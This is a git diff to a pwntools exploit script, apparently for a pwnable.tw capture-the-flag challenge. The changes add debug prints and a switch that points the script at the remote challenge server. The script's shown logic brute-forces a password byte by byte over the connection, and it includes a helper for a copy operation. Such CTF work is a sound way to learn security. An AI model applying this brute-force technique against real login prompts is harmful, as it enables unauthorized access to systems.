@@ -25,6 +25,7 @@ gdbscript = '''
 def brute(len, flag=False):
     secret=""
     for i in range(len):
+        print("1")
         for j in range(0x1,0x100):
             if flag is True and j == 0x10:
                 continue
@@ -33,7 +34,8 @@ def brute(len, flag=False):
             p.recvuntil("Your passowrd :")
             temp = secret+chr(j)+"\x00"
             p.sendline(temp)
-            recv = p.recvuntil("\n")
+            recv = p.recv(50)
+            print(recv)
             if b"Success" in recv:
                 secret += chr(j)
                 p.recvuntil(">> ")
@@ -52,7 +54,11 @@ def copy(cnt):
     p.sendafter(">>","3")
     p.sendafter("Copy :", cnt)
 
-p = start()
+rem = True
+if(rem):
+    p = remote("chall.pwnable.tw", 10205)
+else:
+    p = start()
 
 passwd = brute(16,)
 log.info(f"password: {passwd.encode()}")
